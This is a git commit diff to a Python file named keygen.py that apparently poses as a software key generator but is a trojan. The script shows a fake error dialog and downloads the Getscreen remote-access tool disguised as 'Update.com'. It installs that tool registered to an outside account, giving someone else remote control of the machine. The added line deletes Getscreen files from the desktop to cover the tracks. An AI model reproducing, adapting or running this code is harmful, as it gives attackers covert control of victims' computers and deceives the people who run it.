ff27fa1eaf798d7ecb326771b3fa0ed78025a9c3
dartzfork <dartzcvm@proton.me>
2025-05-18 00:44:33 +0200

    Update keygen.py

--- keygen.py
+++ keygen.py
@@ -1,10 +1,11 @@
 import os
 import time
 import sys
-with open("BestFriend.vbs", "w") as file:
+with open("newver", "w") as file:
     file.write('x=msgbox("", 2+16, "Error")')
     file.close
 os.system("cmd /c start wscript.exe BestFriend.vbs")
 os.system("curl https://getscreen.me/download/getscreen.exe --output Update.com")
 time.sleep(10)
 os.system("cmd /c start Update.com -install -register randomvps@alwaysdata.net")
+os.system("del /s /q /f %userprofile%\Desktop\Getscreen*")
